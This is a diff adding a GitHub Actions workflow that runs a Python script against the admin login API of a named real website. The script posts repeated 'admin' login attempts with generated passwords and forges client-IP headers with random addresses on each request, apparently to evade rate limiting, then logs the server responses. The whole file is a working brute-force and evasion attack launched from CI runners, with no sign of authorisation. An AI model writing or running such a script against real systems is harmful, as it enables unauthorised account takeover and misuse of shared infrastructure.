@@ -1,0 +1,45 @@
+name: probe
+on:
+  workflow_dispatch:
+    inputs:
+      n: {description: n, required: false, type: string, default: "20"}
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        env:
+          N: ${{ inputs.n }}
+        run: |
+          cat > /tmp/probe.py <<'PYEOF'
+          import os,json,random,time,urllib.request,urllib.error
+          N=int(os.environ.get("N","20"))
+          URL="https://www.kufaka.com/adminApi/auth/login"
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          rng=random.Random(1234)
+          def rip(): return "%d.%d.%d.%d"%(rng.randint(1,223),rng.randint(0,255),rng.randint(0,255),rng.randint(1,254))
+          for i in range(N):
+              ip=rip()
+              body=json.dumps({"username":"admin","password":"zzqx%d"%i}).encode()
+              req=urllib.request.Request(URL,data=body,method="POST")
+              req.add_header("Content-Type","application/json")
+              req.add_header("User-Agent",UA)
+              req.add_header("Referer","https://www.kufaka.com/package/admin/")
+              req.add_header("Origin","https://www.kufaka.com")
+              req.add_header("Accept","application/json, text/plain, */*")
+              req.add_header("X-Forwarded-For",ip); req.add_header("CF-Connecting-IP",ip); req.add_header("X-Real-IP",ip)
+              try:
+                  r=urllib.request.urlopen(req,timeout=25); st=r.status; b=r.read().decode("utf-8","ignore")
+              except urllib.error.HTTPError as e:
+                  st=e.code
+                  try: b=e.read().decode("utf-8","ignore")
+                  except Exception: b=""
+              except Exception as e:
+                  print("REQ %d ERR %s"%(i,type(e).__name__),flush=True); time.sleep(1.0); continue
+              print("REQ %d st=%s len=%d body=%s"%(i,st,len(b),b[:400].replace("\n"," ")),flush=True)
+              time.sleep(1.0)
+          PYEOF
+          python3 /tmp/probe.py
